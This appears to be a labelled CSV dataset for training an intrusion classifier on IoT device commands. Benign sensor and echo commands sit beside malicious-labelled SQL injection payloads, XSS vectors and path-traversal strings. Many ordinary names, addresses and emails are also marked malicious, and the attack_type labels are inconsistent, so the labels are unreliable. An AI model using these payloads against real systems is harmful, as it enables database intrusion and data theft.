payload,label,attack_type
90230020p,malicious,cmd_parse_error
"echo, ['mqtt', 'sensor', 'esp32', 'world']",benign,norm
1')) as dqdv where 8126=8126 and 4595=4595#,malicious,cmd_parse_error
"start_temp_report, 40",benign,norm
"echo, ['payload', 'safe', 'iot']",benign,norm
shing-mi,malicious,cmd_parse_error
"run_cmd, ADD 154 634",benign,norm
mel,malicious,cmd_parse_error
"run_cmd, ADD 216 182",benign,norm
"start_temp_report, 94",benign,norm
"1'+(select nzij where 5456=5456 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x))+'",malicious,cmdi
"echo, ['ping', 'report', 'status']",benign,norm
"start_temp_report, 44",benign,norm
"1"")) and (3020=3020)*6703 and ((""bely""=""bely",malicious,cmd_parse_error
starr-fjelmose@cdgranadabaila.travel,malicious,cmd_parse_error
4l09o636a,malicious,cmd_parse_error
"run_cmd, ADD 470 323",benign,norm
"run_cmd, echo ['ping', 'esp32', 'sensor']",benign,norm
"1"") as ucex where 5148=5148 order by 1#",malicious,cmd_parse_error
wolfs,malicious,cmd_parse_error
"1'+(select 'yjpp' where 8966=8966;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)+'",malicious,cmdi
"run_cmd, ADD 111 732",benign,norm
"passatge riu ebre 32,",malicious,cmd_parse_error
vilamasa pacheca,malicious,cmd_parse_error
"echo, ['report', 'sensor', 'safe', 'ready']",benign,norm
"-6155%')) union all select 2421,2421,2421,2421,2421#",malicious,cmd_parse_error
1281450288895094,malicious,cmd_parse_error
"echo, ['status', 'report', 'iot', 'mqtt']",benign,norm
4887,malicious,cmd_parse_error
"run_cmd, echo ['status']",benign,norm
"run_cmd, ADD 359 830",benign,norm
"start_temp_report, 93",benign,norm
"run_cmd, ADD 733 654",benign,norm
"echo, ['device', 'esp32', 'normal']",benign,norm
27190,malicious,cmd_parse_error
"run_cmd, echo ['safe', 'payload', 'report']",benign,norm
"run_cmd, ADD 68 55",benign,norm
"run_cmd, echo ['safe', 'ready', 'ping', 'sensor']",benign,norm
69634179t,malicious,cmd_parse_error
"run_cmd, echo ['ok']",benign,norm
"run_cmd, echo ['ready', 'hello', 'status']",benign,norm
"echo, ['system', 'esp32', 'normal', 'hello']",benign,norm
"run_cmd, ADD 594 282",benign,norm
5818,malicious,cmd_parse_error
"echo, ['normal', 'esp32']",benign,norm
"run_cmd, echo ['hello', 'esp32', 'device', 'system']",benign,norm
joaquin,malicious,cmd_parse_error
"run_cmd, ADD 177 948",benign,norm
"run_cmd, echo ['ok', 'normal']",benign,norm
sabrina,malicious,cmd_parse_error
tudanca,malicious,cmd_parse_error
dante@opticaweb.mobi,malicious,cmd_parse_error
"run_cmd, ADD 9 433",benign,norm
91494736t,malicious,cmd_parse_error
"run_cmd, ADD 341 578",benign,norm
"echo, ['status', 'system']",benign,norm
"run_cmd, ADD 559 192",benign,norm
"1"") and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""otgh"" like ""otgh",malicious,cmd_parse_error
"start_temp_report, 52",benign,norm
"-6368)) union all select 4646,4646,4646,4646,4646,4646,4646--",malicious,cmd_parse_error
31228,malicious,cmd_parse_error
"run_cmd, echo ['device', 'ready']",benign,norm
"-2001'+(select 'nput' where 8368=8368 union all select 8368,8368,8368,8368,8368,8368,8368,8368,8368#",malicious,cmd_parse_error
"start_temp_report, 16",benign,norm
vitola@23horas.ad,malicious,cmd_parse_error
"run_cmd, echo ['world']",benign,norm
"<meta http-equiv=""refresh"" content=""0;url=javascript:alert('crosssitescripting');"">",malicious,cmdi
tarrs,malicious,cmd_parse_error
"run_cmd, echo ['normal']",benign,norm
"start_temp_report, 100",benign,norm
forst,malicious,cmd_parse_error
"run_cmd, echo ['ready', 'world', 'payload', 'iot']",benign,norm
56546514w,malicious,cmd_parse_error
"1%""));select case when 7717=7717 then 1 else null end--",malicious,cmdi
"echo, ['ping']",benign,norm
"run_cmd, echo ['normal', 'iot']",benign,norm
dannunzio.sugiura@ilusionarium.sj,malicious,cmd_parse_error
"1"")) as luon where 4676=4676 rlike sleep(5)#",malicious,cmd_parse_error
"run_cmd, echo ['sensor', 'normal', 'esp32']",benign,norm
"1'));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (('xiyl' like 'xiyl",malicious,cmdi
"run_cmd, echo ['world', 'device', 'mqtt']",benign,norm
4nemmetr6,malicious,cmd_parse_error
0957098737909112,malicious,cmd_parse_error
"san jorge, 188",malicious,cmd_parse_error
"start_temp_report, 23",benign,norm
"echo, ['status', 'ping']",benign,norm
"1))) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",malicious,cmd_parse_error
"echo, ['report', 'mqtt', 'system', 'ping']",benign,norm
50835477a,malicious,cmd_parse_error
"start_temp_report, 88",benign,norm
"run_cmd, echo ['mqtt']",benign,norm
"run_cmd, ADD 723 50",benign,norm
"run_cmd, echo ['hello', 'ready', 'system']",benign,norm
"start_temp_report, 69",benign,norm
8935,malicious,cmd_parse_error
hilda,malicious,cmd_parse_error
"1"")));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((""lzyl"" like ""lzyl",malicious,cmdi
maitn,malicious,cmd_parse_error
radley,malicious,cmd_parse_error
"run_cmd, ADD 273 886",benign,norm
gustat0v4,malicious,cmd_parse_error
"1"" or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ""uosc""=""uosc",malicious,cmd_parse_error
"1'));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('nimx'='nimx",malicious,cmdi
"1'+(select 'ewlk' where 1078=1078 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",malicious,cmd_parse_error
"start_temp_report, 58",benign,norm
"(convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (9339=9339) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))))",malicious,cmd_parse_error
"run_cmd, echo ['world', 'normal', 'hello', 'iot']",benign,norm
"echo, ['world', 'mqtt', 'iot', 'ok']",benign,norm
lomoviejo,malicious,cmd_parse_error
"start_temp_report, 83",benign,norm
"run_cmd, echo ['ping', 'data', 'esp32']",benign,norm
"start_temp_report, 82",benign,norm
"echo, ['world', 'data', 'ready', 'hello']",benign,norm
"run_cmd, ADD 921 995",benign,norm
"run_cmd, ADD 193 437",benign,norm
camp fein,malicious,cmd_parse_error
5555,malicious,cmd_parse_error
caballillo,malicious,cmd_parse_error
-2483' where 1327=1327 union all select 1327#,malicious,cmd_parse_error
"estrada mendiarte s/n, 10?a",malicious,cmd_parse_error
"1"");select count(*) from generate_series(1,5000000)--",malicious,cmdi
"-2715')) union all select 8646,8646,8646,8646,8646,8646,8646,8646--",malicious,cmd_parse_error
"echo, ['ok', 'payload', 'status']",benign,norm
4e03+17a9a,malicious,cmd_parse_error
"echo, ['payload', 'normal']",benign,norm
39699852n,malicious,cmd_parse_error
"run_cmd, echo ['system']",benign,norm
"run_cmd, ADD 698 773",benign,norm
2780139956948714,malicious,cmd_parse_error
"run_cmd, ADD 967 229",benign,norm
"run_cmd, ADD 624 332",benign,norm
katsuno@novolardiseno.br,malicious,cmd_parse_error
"start_temp_report, 23",benign,norm
elian,malicious,cmd_parse_error
"run_cmd, ADD 503 8",benign,norm
"start_temp_report, 88",benign,norm
38428968q,malicious,cmd_parse_error
richwine.badolati@gallegonicolas.er,malicious,cmd_parse_error
"run_cmd, ADD 88 407",benign,norm
"run_cmd, ADD 399 558",benign,norm
azarosa,malicious,cmd_parse_error
43814,malicious,cmd_parse_error
shalne,malicious,cmd_parse_error
"start_temp_report, 50",benign,norm
"echo, ['sensor', 'world', 'ok', 'ready']",benign,norm
"1) where 7978=7978 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",malicious,cmdi
c/ balanegra 57 8?a,malicious,cmd_parse_error
"run_cmd, ADD 825 499",benign,norm
"1) as caoa where 6139=6139 union all select null,null,null,null,null,null,null,null--",malicious,cmd_parse_error
8arrascal485,malicious,cmd_parse_error
"start_temp_report, 107",benign,norm
"start_temp_report, 91",benign,norm
..........web-infweb.xml,malicious,cmd_parse_error
"start_temp_report, 80",benign,norm
"run_cmd, echo ['ping']",benign,norm
1) waitfor delay '0:0:5'--,malicious,cmd_parse_error
"start_temp_report, 118",benign,norm
langa del castillo,malicious,cmd_parse_error
"run_cmd, ADD 979 328",benign,norm
"start_temp_report, 23",benign,norm
"run_cmd, ADD 886 893",benign,norm
omen@meneamex.sh,malicious,cmd_parse_error
"echo, ['ready', 'world', 'data']",benign,norm
corella,malicious,cmd_parse_error
36101272n,malicious,cmd_parse_error
"1"");begin user_lock.sleep(5); end--",malicious,cmdi
"run_cmd, echo ['sensor', 'safe']",benign,norm
"start_temp_report, 34",benign,norm
"-5009) where 8463=8463 union all select 8463,8463,8463,8463,8463,8463--",malicious,cmd_parse_error
"1) where 3076=3076 union all select null,null,null,null,null--",malicious,cmd_parse_error
"c/ granate 13, 12h",malicious,cmd_parse_error
04869,malicious,cmd_parse_error
palacios del pan,malicious,cmd_parse_error
"run_cmd, ADD 668 656",benign,norm
"1"")) as puws where 7006=7006;select (case when (7997=1543) then 7997 else cast(1 as int)/(select 0 from dual) end) from dual--",malicious,cmdi
"run_cmd, echo ['mqtt', 'ping', 'normal', 'ready']",benign,norm
"start_temp_report, 84",benign,norm
"echo, ['status', 'ok']",benign,norm
"echo, ['sensor', 'system', 'mqtt', 'device']",benign,norm
grigoriu matons,malicious,cmd_parse_error
"run_cmd, ADD 227 644",benign,norm
"run_cmd, ADD 100 896",benign,norm
"start_temp_report, 119",benign,norm
"run_cmd, echo ['mqtt', 'normal']",benign,norm
"echo, ['report', 'device', 'iot']",benign,norm
"echo, ['normal', 'report', 'ready', 'hello']",benign,norm
"echo, ['normal']",benign,norm
//../../../../../..{file},malicious,cmd_parse_error
"echo, ['safe', 'sensor', 'payload']",benign,norm
"run_cmd, echo ['data', 'ping', 'ok']",benign,norm
"start_temp_report, 17",benign,norm
"c/ santa olaja, 121 2?d",malicious,cmd_parse_error
"start_temp_report, 55",benign,norm
"run_cmd, echo ['device']",benign,norm
ren,malicious,cmd_parse_error
2008,malicious,cmd_parse_error
"echo, ['data', 'normal', 'hello', 'system']",benign,norm
"run_cmd, ADD 632 416",benign,norm
"1"" and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",malicious,cmd_parse_error
"-3733')) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('ybgd'='ybgd",malicious,cmdi
olmo,malicious,cmd_parse_error
"(cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select 1 from generate_series(9815,9815,case when (9815=9815) then 1 else 0 end) limit 1)::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric))",malicious,cmdi
42855301e,malicious,cmd_parse_error
"run_cmd, ADD 165 200",benign,norm
"echo, ['mqtt', 'data', 'normal', 'world']",benign,norm
"run_cmd, echo ['esp32', 'status']",benign,norm
"start_temp_report, 48",benign,norm
"start_temp_report, 67",benign,norm
"run_cmd, ADD 281 431",benign,norm
"start_temp_report, 62",benign,norm
"run_cmd, echo ['hello', 'report', 'ping', 'status']",benign,norm
"run_cmd, ADD 67 477",benign,norm
"run_cmd, echo ['report', 'hello', 'device', 'status']",benign,norm
65046174n,malicious,cmd_parse_error
"run_cmd, echo ['world', 'data', 'normal', 'device']",benign,norm
"run_cmd, echo ['normal', 'world']",benign,norm
"1') as ohnu where 4097=4097 union all select null,null,null,null,null,null,null,null,null--",malicious,cmd_parse_error
"run_cmd, echo ['esp32']",benign,norm
"run_cmd, echo ['ping']",benign,norm
krzyski-wieman@hiperzaragoza.er,malicious,cmd_parse_error
"start_temp_report, 101",benign,norm
den21o9a,malicious,cmd_parse_error
"<div style=""background-image: url(javascript:alert('crosssitescripting'))"">",malicious,cmdi
las gijn,malicious,cmd_parse_error
8855,malicious,cmd_parse_error
"-1339))) union all select 6318,6318,6318,6318,6318,6318,6318,6318,6318#",malicious,cmd_parse_error
"run_cmd, ADD 593 616",benign,norm
6e665a,malicious,cmd_parse_error
"start_temp_report, 73",benign,norm
trauberg_lion@viscotek.pl,malicious,cmd_parse_error
"1 where 2914=2914 union all select null,null,null#",malicious,cmd_parse_error
"1%"") procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (""%""=""",malicious,cmd_parse_error
ace673,malicious,cmd_parse_error
cohen encabo,malicious,cmd_parse_error
23711,malicious,cmd_parse_error
"run_cmd, echo ['sensor', 'ok', 'esp32', 'ready']",benign,norm
"payo gomez 188, 4-c",malicious,cmd_parse_error
"run_cmd, ADD 601 212",benign,norm
"echo, ['safe', 'payload', 'hello']",benign,norm
"-7126')) as fzpp where 8078=8078 union all select 8078,8078,8078,8078,8078,8078,8078#",malicious,cmd_parse_error
"calle jabera, 27,",malicious,cmd_parse_error
orera,malicious,cmd_parse_error
"run_cmd, echo ['sensor', 'system', 'ok', 'esp32']",benign,norm
"echo, ['normal']",benign,norm
1) as jmib where 8130=8130 rlike (select (case when (7885=3932) then 1 else 0x28 end))--,malicious,cmd_parse_error
"start_temp_report, 62",benign,norm
"run_cmd, ADD 290 455",benign,norm
"run_cmd, echo ['device', 'ping', 'ok', 'payload']",benign,norm
"echo, ['hello', 'system', 'status']",benign,norm
"run_cmd, ADD 452 620",benign,norm
"echo, ['device']",benign,norm
4907869$l2,malicious,cmdi
"echo, ['status']",benign,norm
"run_cmd, echo ['sensor']",benign,norm
"echo, ['device', 'data', 'ready', 'ping']",benign,norm
"run_cmd, echo ['esp32', 'hello', 'ready']",benign,norm
"run_cmd, ADD 816 743",benign,norm
"start_temp_report, 12",benign,norm
hinchey,malicious,cmd_parse_error
"run_cmd, ADD 602 350",benign,norm
"start_temp_report, 13",benign,norm
"echo, ['ping', 'ok', 'iot']",benign,norm
"run_cmd, echo ['system']",benign,norm
"run_cmd, ADD 903 468",benign,norm
"echo, ['hello', 'system', 'safe', 'status']",benign,norm
"start_temp_report, 117",benign,norm
"-8166""))) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (((""lcqb""=""lcqb",malicious,cmdi
"run_cmd, ADD 409 528",benign,norm
"start_temp_report, 93",benign,norm
"start_temp_report, 28",benign,norm
"echo, ['esp32', 'payload', 'safe']",benign,norm
"start_temp_report, 87",benign,norm
"start_temp_report, 45",benign,norm
"1"") or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (""dwpa""=""dwpa",malicious,cmdi
1' rlike (select (case when (5567=5586) then 1 else 0x28 end)) and 'mmnb'='mmnb,malicious,cmd_parse_error
"echo, ['ready', 'mqtt', 'sensor']",benign,norm
1') or sleep(5) and ('kgbm'='kgbm,malicious,cmd_parse_error
85nefici0r3o,malicious,cmd_parse_error
"run_cmd, ADD 591 778",benign,norm
"echo, ['ping', 'report', 'data', 'sensor']",benign,norm
21254057x,malicious,cmd_parse_error
"1%""))) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (((""%""=""",malicious,cmd_parse_error
"echo, ['hello']",benign,norm
"run_cmd, ADD 336 3",benign,norm
+dir+c:/,malicious,cmd_parse_error
"echo, ['sensor', 'ok', 'safe']",benign,norm
"echo, ['report', 'world', 'status']",benign,norm
"run_cmd, echo ['mqtt']",benign,norm
"start_temp_report, 79",benign,norm
"start_temp_report, 20",benign,norm
"start_temp_report, 32",benign,norm
56030847h,malicious,cmd_parse_error
"1'))) and elt(1210=1210,sleep(5)) and ((('mbxh' like 'mbxh",malicious,cmd_parse_error
bernay3@la-sexta-f1.mm,malicious,cmd_parse_error
"run_cmd, echo ['report', 'payload', 'iot', 'hello']",benign,norm
"run_cmd, ADD 991 552",benign,norm
"start_temp_report, 41",benign,norm
file:........................etcpasswd,malicious,cmd_parse_error
"echo, ['report']",benign,norm
6398147509756321,malicious,cmd_parse_error
"run_cmd, echo ['system']",benign,norm
"1;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",malicious,cmdi
"run_cmd, echo ['system', 'report', 'ok']",benign,norm
"1%"")) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",malicious,cmdi
"run_cmd, ADD 890 503",benign,norm
"run_cmd, ADD 978 257",benign,norm
atilio,malicious,cmd_parse_error
"run_cmd, ADD 563 72",benign,norm
"1') where 6941=6941 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",malicious,cmdi
"run_cmd, ADD 136 46",benign,norm
"run_cmd, ADD 15 177",benign,norm
"echo, ['ping', 'hello', 'data']",benign,norm
"echo, ['ping', 'status', 'world', 'system']",benign,norm
"start_temp_report, 58",benign,norm
"echo, ['device']",benign,norm
"run_cmd, echo ['sensor', 'status', 'ping', 'mqtt']",benign,norm
"run_cmd, echo ['iot']",benign,norm
"run_cmd, ADD 20 626",benign,norm
"start_temp_report, 72",benign,norm
"run_cmd, echo ['normal', 'safe']",benign,norm
1%');select (case when (3773=3722) then 3773 else 3773*(select 3773 from mysql.db) end)#,malicious,cmdi
6877205573294951,malicious,cmd_parse_error
46470,malicious,cmd_parse_error
"run_cmd, echo ['ok', 'status', 'iot']",benign,norm
"run_cmd, ADD 346 256",benign,norm
"run_cmd, ADD 912 338",benign,norm
cartes,malicious,cmd_parse_error
cruzado garmes,malicious,cmd_parse_error
"run_cmd, echo ['system', 'ping', 'mqtt', 'ready']",benign,norm
"start_temp_report, 89",benign,norm
"run_cmd, ADD 840 849",benign,norm
"1') as xvcr where 6456=6456 and 3824=benchmark(5000000,md5(0x76555642))--",malicious,cmd_parse_error
"port fangos, 183,",malicious,cmd_parse_error
"start_temp_report, 75",benign,norm
"1')))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ((('owga' like 'owga",malicious,cmdi
"echo, ['report']",benign,norm
"run_cmd, ADD 69 165",benign,norm
"run_cmd, echo ['safe']",benign,norm
teodora,malicious,cmd_parse_error
"run_cmd, ADD 589 850",benign,norm
"1"" and 3824=benchmark(5000000,md5(0x76555642))",malicious,cmd_parse_error
